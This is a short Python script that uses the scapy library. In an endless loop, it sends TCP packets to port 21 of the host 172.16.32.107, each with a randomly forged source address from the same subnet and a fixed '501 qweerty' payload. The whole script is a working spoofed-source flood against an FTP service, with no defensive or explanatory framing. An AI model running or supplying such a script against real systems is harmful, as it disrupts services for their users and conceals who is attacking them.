from scapy.all import *
from random import *

def ftp(random):
    ip = IP(dst="172.16.32.107", src="172.16.32."+str(random))
    tcp = TCP(dport=21)
    payload = "501 qweerty"

    package = ip/tcp/payload
    send(package)

while True:
    a = randint(0,254)
    ftp(a)
